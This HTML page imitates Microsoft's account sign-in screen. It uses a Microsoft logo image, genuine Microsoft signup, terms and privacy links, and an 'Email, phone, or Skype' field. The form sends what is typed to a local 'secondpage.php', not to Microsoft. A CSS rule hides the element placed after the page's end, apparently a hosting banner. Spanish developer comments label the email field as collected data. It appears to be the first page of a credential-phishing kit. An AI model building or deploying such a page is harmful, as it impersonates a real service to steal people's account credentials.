<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
		<title>Sign in to your Microsoft account</title>
		<link rel="icon" href="img/favicon.ico">
		<link rel="stylesheet" href="Style.css">

		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">

		
		<link href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.16.0/css/mdb.min.css" rel="stylesheet">
	 
		
		<link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet">
		<style>
		    #ultimo + div{
		        visibility: hidden;
		    }
		</style>
	</head>
	<body> 
		<div class="contenedoroso bg-sucess row align-items-center justify-content-center vh-100 mt-4">

			<form class="card container py-4 px-4" id="mycontainer" action="secondpage.php" method="post">

				  <!-- Card image -->
<!-- 			  <div class="loader" id="boxes"></div>
				  <div class="loader" id="boxes"></div>
				  <div class="loader" id="boxes"></div>
				  <div class="loader" id="boxes"></div> -->

				  <div class="container d-inline mt-3">
				    <img class="float-left " src="img/card.svg" width="108" height="24" 
				      alt="Card image cap" id="myimage">
				  </div>

				 	<!-- Card content -->
				 	<div class="card-body rounded-bottom">

					   <!-- Title -->
						<div class="mb-0">
						   <h4 class="card-title mb-2">Sign In</h4>
						</div>
						<div class="md-form mb-2">
					   	<!-- DATOS EMAIL -->
                            <input type="email" name="email" id="correo" class="form-control" required>            
                            <label for="email" class="">Email, phone, or Skype</label>
                        </div>
						   <!-- Text -->
						   <p class="card-text mb-2">No account? <a href="https://signup.live.com/?wa=wsignin1.0&rpsnv=13&ct=1589150126&rver=7.0.6738.0&wp=MBI_SSL&wreply=https:%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefp%253Dsignedout-index%2526refd%253Dwww.google.com&id=292666&lw=1&fl=easi2&contextid=B6B4CFFE7B54C130&bk=1589150130&uiflavor=web&lic=1&mkt=EN-US&lc=1033&uaid=6f22839701c643616da0c2d4f395b28a">Create One!</a></p>
						   <p class="card-text mb-2"><a href="#">Sign-in options</a></p>		
		  			</div>
		  				<!-- BUTTON -->
		  				<div class="text-center text-md-right mb-2 mr-2">
							<input type="submit" name="register" value="Next" class="btn btn-primary text-capitalize px-4">
            			</div>
			</form>
		</div>
		<footer class="footer font-small px-3 fixed-bottom">
			 <!-- Copyright -->
	        <div class="footer-modern-line-3">
	          <div class="container">
	            <div class="row row-10 justify-content-between">
	              <div class="col-md-6"><span></span></div>
	              <div class="col-md-auto">
	                <p class="rights footer text-white small px-2"><a class="text-white" href="https://www.microsoft.com/es-es/servicesagreement/">Terms of use</a>	
	                  <a class="text-white small px-2" href="https://privacy.microsoft.com/es-es/privacystatement">Privacy & cookies</a>
						<a class="text-white small px-2" href="#">...</a>
	              	</p>
	              </div>
	            </div>
	          </div>
	        </div>
        <!-- Copyright -->
		</footer>
		<!-- JQuery -->
	    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>

	    <!-- Bootstrap tooltips -->
	    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.4/umd/popper.min.js"></script>

	    <!-- Bootstrap core JavaScript -->
	    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>

	    <!-- MDB core JavaScript -->
	    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.16.0/js/mdb.min.js"></script>
	    <!-- My script -->
	    <script type="text/javascript" src="js/script.js"></script>
	    
	    <div id="ultimo"></div>
	</body>	
</html>